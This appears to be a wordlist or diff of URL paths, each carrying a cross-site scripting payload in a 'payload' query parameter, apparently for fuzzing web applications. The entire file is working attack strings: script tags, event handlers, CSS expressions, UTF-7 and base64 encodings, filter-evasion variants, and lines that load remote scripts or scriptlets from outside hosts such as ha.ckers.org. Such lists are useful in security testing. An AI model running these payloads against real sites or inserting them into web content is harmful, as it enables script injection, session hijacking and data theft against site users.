+/path0/path1/path2/?payload=</title><script>alert("crosssitescripting");</script>
+/path0/path1/?payload=<img src="javascript:alert('crosssitescripting');">
+/?payload=<img src=javascript:alert('crosssitescripting')>
+/path0/path1/path2/?payload=<img src=javascript:alert("crosssitescripting")>
+/path0/?payload=<img src=`javascript:alert("rm'crosssitescripting'")`>
+/path0/path1/?payload=<img """><script>alert("crosssitescripting")</script>">
+/?payload=<img src=javascript:alert(string.fromcharcode(88,83,83))>
+/path0/path1/path2/path3/?payload=<img src="jav ascript:alert('crosssitescripting');">
+/?payload=<img src=" javascript:alert('crosssitescripting');">
+/path0/path1/?payload=<img src="javascript:alert('crosssitescripting')"
+/?payload=<img dynsrc="javascript:alert('crosssitescripting')">
+/?payload=<img lowsrc="javascript:alert('crosssitescripting')">
+/path0/?payload=<img src='vbscript:msgbox("crosssitescripting")'>
+/path0/path1/path2/path3/?payload=<img src="mocha:[code]">
+/path0/path1/path2/path3/?payload=<img src="livescript:[code]">
+/path0/path1/?payload=<meta http-equiv="refresh" content="0;url=javascript:alert('crosssitescripting');">
+/path0/path1/?payload=<meta http-equiv="refresh" content="0;url=data:text/html;base64,phnjcmlwdd5hbgvydcgnwfntjyk8l3njcmlwdd4k">
+/path0/path1/?payload=<meta http-equiv="refresh" content="0; url=http://;url=javascript:alert('crosssitescripting');">
+/path0/path1/path2/?payload=<meta http-equiv="link" content="<http://vulnerability-lab.com/crosssitescripting.css>; rel=stylesheet">
+/path0/?payload=<meta http-equiv="set-cookie" content="userid=<script>alert('crosssitescripting')</script>">
+/path0/path1/path2/path3/?payload=<head><meta http-equiv="content-type" content="text/html; charset=utf-7"> </head>+adw-script+ad4-alert('crosssitescripting');+adw-/script+ad4-
+/path0/path1/path2/path3/?payload=<object type="text/x-scriptlet" data="http://vulnerability-lab.com/scriptlet.html"></object>
+/path0/path1/?payload=<object classid=clsid:ae24fdae-03c6-11d1-8b76-0080c744f389><param name=url value=javascript:alert('crosssitescripting')></object>
+/path0/path1/path2/?payload=<style>@im\\port'\\ja asc ipt:alert("crosssitescripting")';</style>
+/?payload=<style>@import'http://vulnerability-lab.com/crosssitescripting.css';</style>
+/path0/path1/path2/?payload=<style type="text/javascript">alert('crosssitescripting');</style>
+/path0/path1/path2/path3/?payload=<style>.crosssitescripting{background-image:url("javascript:alert('crosssitescripting')");}</style><a class=crosssitescripting></a>
+/path0/path1/path2/?payload=<style type="text/css">body{background:url("javascript:alert('crosssitescripting')")}</style>
+/?payload=<style>li {list-style-image: url("javascript:alert('crosssitescripting')");}</style><ul><li>crosssitescripting
+/path0/path1/path2/?payload=<style>body{-moz-binding:url("http://vulnerability-lab.com/crosssitescriptingmoz.xml#crosssitescripting")}</style>
+/path0/?payload=<div style="background-image: url(javascript:alert('crosssitescripting'))">
+/path0/path1/path2/?payload=<div style="background-image:52c8'a161332904a1c5248.10278.1053379'9">
+/path0/path1/path2/?payload=<div style="width: expression(alert('crosssitescripting'));">
+/path0/path1/path2/?payload=<layer src="http://vulnerability-lab.com/script.html"></layer>
+/path0/path1/path2/path3/?payload=<link rel="stylesheet" href="javascript:alert('crosssitescripting');">
+/path0/?payload=<link rel="stylesheet" href="http://vulnerability-lab.com/crosssitescripting.css">
+/path0/?payload=<body background="javascript:alert('crosssitescripting')">
+/path0/path1/?payload=<body onload=alert('crosssitescripting')>
+/path0/path1/path2/?payload=<img low id=xss src="javascript:alert('xss')">
+/path0/path1/path2/path3/?payload=<bgsound id=xss src="javascript:alert('xss');">
+/path0/?payload=<link rel="stylesheet" href="javascript:alert('xss');">
+/path0/path1/?payload=<img id=xss src='vbscript:msgbox("xss")'>
+/path0/path1/?payload=<meta http-equiv="refresh" content="0;url=javascript:alert('xss');">
+/path0/path1/?payload=<table id=xss background="javascript:alert('xss')">
+/path0/?payload=<table id=xss><td background="javascript:alert('xss')">
+/path0/path1/path2/path3/?payload=<div id=xss style="background-image: url(javascript:alert('xss'))">
+/path0/path1/path2/?payload=<div id=xss style="width: expression(alert('xss'));">
+/?payload=<iframe id=xss src="javascript:alert('xss');"></iframe>
+/path0/path1/path2/?payload=<frameset><frame id=xss src="javascript:alert('xss');"></frameset>
+/path0/path1/path2/path3/?payload=<table background="javascript:alert('xss')">
+/path0/path1/?payload=<table><td background="javascript:alert('xss')">"
+/path0/path1/path2/path3/?payload=<style>@im\\port'\\ja asc ipt:alert("xss")';</style>
+/path0/path1/path2/path3/?payload=<img id=xss style="xss:expr/*xss*/ession(alert('xss'))">
+/?payload=<style type="text/javascript">alert('xss');</style>
+/?payload=<style>.xss{background-image:url("javascript:alert('xss')");}</style><a class=xss></a>
+/path0/?payload=<style type="text/css">body{background:url("javascript:alert('xss')")}</style>
+/?payload=<base href="javascript:alert('xss');//">
+/path0/path1/path2/?payload=<object classid=clsid:ae24fdae-03c6-11d1-8b76-0080c744f389><param name=url value=javascript:alert('xss')></object>
+/?payload=a="get";b="url("";c="javascript:";d="alert('xss');")";eval(a+b+c+d);
+/path0/?payload=<xml id=xss><x><c><![cdata[<img id=xss src="javas]]><![cdata[cript:alert('xss');">]]></c></x><xml><span dataid=xss src=#i datafld=cdataformatas=html></span>
+/path0/?payload=<xml id="xss"><i><b><img id=xss src="javas<!-- -->cript:alert('xss')"></b></i></xml><span dataid=xss src="#xss" datafld="b" dataformatas="html"></span>
+/path0/path1/path2/path3/?payload=<xml id=xss src="xsstest.xml" id=i></xml><span dataid=xss src=#i datafld=c dataformatas=html></span>
+/?payload=<html><body><?xml:namespace prefix="t" ns="urn:schemas-microsoft-com:time"><?import namespace="t" implementation="#default#time2"><t:set attributename="innerhtml" to="xss<script defer>alert("xss")</script>"></body></html>
+/path0/?payload=<? echo('<scr)';echo('ipt>alert("xss")</script>'); ?>
+/?payload=<meta http-equiv="set-cookie" content="userid=<script>alert('xss')</script>">
+/?payload=<script id=xss src=http://127.0.0.1></script>
+/path0/path1/path2/?payload=//--></script>">'><script>alert(string.fromcharcode(88,83,83))</script>
+/path0/path1/path2/path3/?payload=<img id=xss src=javascript:alert(string.fromcharcode(88,83,83))>
+/path0/path1/?payload=<img id=xss src="&14;javascript:alert('xss');">
+/?payload=<script <b>=alert('xss');"></script>
+/path0/path1/path2/path3/?payload=<iframe id=xss src="javascript:alert('xss'); <
+/path0/path1/?payload=<script>a=/xss/nalert('xss');</script>
+/path0/path1/path2/path3/?payload=<style>li {list-style-image: url("javascript:alert('xss');</style><ul><li>xss
+/path0/?payload=<div style="background-image: url(javascript:alert('xss'));">
+/path0/path1/?payload=<head><meta http-equiv="content-type" content="text/html; charset=utf-7"></head>+adw-script+ad4-alert('xss');+adw-/script+ad4-
+/?payload=<a href="javascript#alert('xss');">
+/path0/path1/?payload=<div onmouseover="alert('xss');">,
+/path0/?payload=<input type="image" dynid=xss src="javascript:alert('xss');">
+/path0/path1/?payload=&<script>alert('xss');</script>">
+/path0/path1/path2/?payload=<img id=xss src=&{alert('xss');};>
+/path0/path1/path2/path3/?payload=<a id=xss href="about:<script>alert('xss');</script>">
+/?payload=<div id=xss style="binding: url(javascript:alert('xss'));">
+/path0/path1/path2/path3/?payload=<object classid=clsid:..." codebase="javascript:alert('xss');">
+/path0/path1/path2/path3/?payload=<style><!--</style><script>alert('xss');//--></script>
+/path0/path1/path2/?payload=![cdata[<!--]]<script>alert('xss');//--></script>
+/path0/path1/path2/?payload=<!-- -- --><script>alert('xss');</script><!-- -- -->
+/?payload=<img id=xss src="blah"onmouseover="alert('xss');">
+/path0/path1/path2/path3/?payload=<img id=xss src="blah>"onmouseover="alert('xss');">
+/path0/path1/path2/?payload=<xml id="x"><a><b><script>alert('xss');</script>;<b></a></xml>
+/path0/?payload=<div datafld="b" dataformatas="html" dataid=xss src="#xss"></div>
+/path0/path1/?payload=[a][a]script>alert('xss');[a][a]/script>
+/path0/path1/?payload=<xml id=i><x><c><![cdata[<img id=xss src="javas]]<![cdata[cript:alert('xss');">]]</c><x></xml>
+/?payload=<form id="test" /><button form="test" formaction="javascript:eval(string['fromcharcode'](97,108,101,114,116,40,39,120,115,115,39,41,32))">x
+/path0/path1/path2/path3/?payload=<input id=xss onfocus=javascript:eval(string['fromcharcode'](97,108,101,114,116,40,39,120,115,115,39,41,32)) autofocus>
+/path0/path1/path2/path3/?payload=<select id=xss onfocus=javascript:eval(string['fromcharcode'](97,108,101,114,116,40,39,120,115,115,39,41,32)) autofocus>
+/?payload=<textarea id=xss onfocus=javascript:eval(string['fromcharcode'](97,108,101,114,116,40,39,120,115,115,39,41,32)) autofocus>
+/path0/path1/path2/?payload=<keygen id=xss onfocus=javascript:eval(string['fromcharcode'](97,108,101,114,116,40,39,120,115,115,39,41,32)) autofocus>
+/path0/?payload=<input id=xss onblur=javascript:eval(string['fromcharcode'](97,108,101,114,116,40,39,120,115,115,39,41,32)) autofocus><input autofocus>
+/path0/path1/path2/path3/?payload=<video id=xss poster=javascript:eval(string['fromcharcode'](97,108,101,114,116,40,39,120,115,115,39,41,32))//
+/path0/path1/path2/path3/?payload=<body id=xss onscroll=eval(string['fromcharcode'](97,108,101,114,116,40,39,120,115,115,39,41,32))><br><br><br><br><br><br><br><br><br><br><br><br><br><br><br><br><br><br><br><br><br><br><br><br><br><br><br><br><br><br><br><br><br><br><br><br><br><br><br><br><input autofocus>
+/path0/path1/?payload=<video><source onerror="javascript:eval(string['fromcharcode'](97,108,101,114,116,40,39,120,115,115,39,41,32))">
+/path0/?payload=<video onerror="javascript:eval(string['fromcharcode'](97,108,101,114,116,40,39,120,115,115,39,41,32))"><source>
+/path0/path1/path2/path3/?payload=<iframe id=xss / /onload=alert(/xss/)></iframe>
+/path0/?payload=<iframe id=xss / "onload=alert(/xss/)></iframe>
+/path0/?payload=<iframe id=xss///////onload=alert(/xss/)></iframe>
+/path0/?payload=<iframe id=xss "onload=alert(/xss/)></iframe>
+/?payload=<iframe id=xss <?php echo chr(11)?> onload=alert(/xss/)></iframe>
+/?payload=<iframe id=xss <?php echo chr(12)?> onload=alert(/xss/)></iframe>
+/path0/?payload=" onfocus=alert(xss) "> <"
+/path0/path1/path2/path3/?payload=" onblur=alert(xss) "> <"
+/path0/?payload=" onmouseover=alert(xss) ">
+/path0/?payload=" onclick=alert(xss) ">
+/?payload=<style>li {list-style-image: url("javascript:alert('xss')");}</style><ul><li>xss
+/path0/?payload=</textarea>'"><script>alert(xss)</script>
+/path0/path1/path2/?payload='""><script language="javascript"> alert('x s s');</script>
+/path0/path1/path2/path3/?payload=</script></script><<<<script><>>>><<<script>alert(xss)</script>
+/?payload=<html><noalert><noscript>(xss)</noscript><script>(xss)</script>
+/path0/path1/path2/path3/?payload='></select><script>alert(xss)</script>
+/path0/path1/path2/?payload=}</style><script>a=eval;b=alert;a(b(/xss/.source));</script>
+/?payload=<script>document.write("xss");</script>
+/path0/?payload=a="get";b="url";c="javascript:";d="alert('xss');";eval(a+b+c+d);
+/path0/path1/path2/path3/?payload=='><script>alert("xss")</script>
+/path0/?payload=<body background=javascript:'"><script>alert(xss)</script>></body>
+/path0/path1/path2/path3/?payload=data:text/html;charset=utf-7;base64,ij48l3rpdgxlpjxzy3jpchq+ywxlcnqomtmznyk8l3njcmlwdd4=
+/path0/path1/path2/path3/?payload=<script>alert('xss');</script>
+/path0/path1/?payload=<script id=xss src=http://ha.ckers.org/xss.js></script>
+/path0/path1/?payload=<img id=xss src=`javascript:alert("rsnake says, 'xss'")`>
+/path0/path1/path2/path3/?payload=id=xss src= <img 6;avascript:alert('xss')>
+/path0/path1/path2/?payload=<script/xss id=xss src="http://ha.ckers.org/xss.js"></script>
+/?payload=<script id=xss src=http://ha.ckers.org/xss.js?<b>
+/path0/path1/path2/path3/?payload=<img id=xss src="javascript:alert('xss')"
+/path0/?payload=<script>a=/xss/
+/path0/path1/?payload=<img dynid=xss src="javascript:alert('xss')">
+/path0/path1/path2/path3/?payload=<img lowid=xss src="javascript:alert('xss')">
+/path0/path1/path2/path3/?payload=<br size="&{alert('xss')}">
+/path0/path1/path2/?payload=<layer id=xss src="http://ha.ckers.org/scriptlet.html"></layer>
+/path0/path1/?payload=<link rel="stylesheet" href="http://ha.ckers.org/xss.css">
+/?payload=<style>@import'http://ha.ckers.org/xss.css';</style>
+/path0/path1/path2/?payload=<meta http-equiv="link" content="<http://ha.ckers.org/xss.css>; rel=stylesheet">
+/?payload=<style>body{-moz-binding:url("http://ha.ckers.org/xssmoz.xml#xss")}</style>
+/path0/path1/?payload=<img id=xss src="mocha:[code]">
+/path0/path1/?payload=<img id=xss src="livescript:[code]">
+/path0/?payload=<meta http-equiv="link" content="<javascript:alert('xss')>; rel=stylesheet">
+/path0/?payload=<meta http-equiv="refresh" content="0; url=http://;url=javascript:alert('xss');">
+/path0/?payload=<div style="background-image: url(javascript:alert('xss'))">
+/?payload=<div style="width: expression(alert('xss'));">
+/?payload=<img style="xss:expr/*xss*/ession(alert('xss'))">
+/path0/path1/path2/?payload=<xss style="xss:expression(alert('xss'))">
+/path0/?payload=exp/*<xss style='no\\xss:noxss("*//*");
+/path0/path1/path2/path3/?payload=<object type="text/x-scriptlet" data="http://ha.ckers.org/scriptlet.html"></object>
+/path0/path1/path2/?payload=geturl("javascript:alert('xss')")
+/path0/?payload=a="get";
+/path0/path1/?payload=<!--<value><![cdata[<xml id=i><x><c><![cdata[<img id=xss src="javas<![cdata[cript:alert('xss');">
+/path0/?payload=<xml id=xss src="http://ha.ckers.org/xsstest.xml" id=i></xml>
+/path0/path1/?payload=<script id=xss src="http://ha.ckers.org/xss.jpg"></script>
+/path0/path1/?payload=<!--#exec cmd="/bin/echo '<script src'"--><!--#exec cmd="/bin/echo '=http://ha.ckers.org/xss.js></script>'"-->
+/path0/?payload=<? echo('<scr)';
+/path0/path1/path2/path3/?payload=<head><meta http-equiv="content-type" content="text/html; charset=utf-7"> </head>+adw-script+ad4-alert('xss');+adw-/script+ad4-
+/path0/path1/path2/?payload=<script a=">" id=xss src="http://ha.ckers.org/xss.js"></script>
+/path0/path1/path2/?payload=<script a=">" '' id=xss src="http://ha.ckers.org/xss.js"></script>
+/path0/path1/path2/?payload=<script "a='>'" id=xss src="http://ha.ckers.org/xss.js"></script>
+/?payload=<script a=`>` id=xss src="http://ha.ckers.org/xss.js"></script>
+/?payload=<script>document.write("<scri");</script>pt id=xss src="http://ha.ckers.org/xss.js"></script>
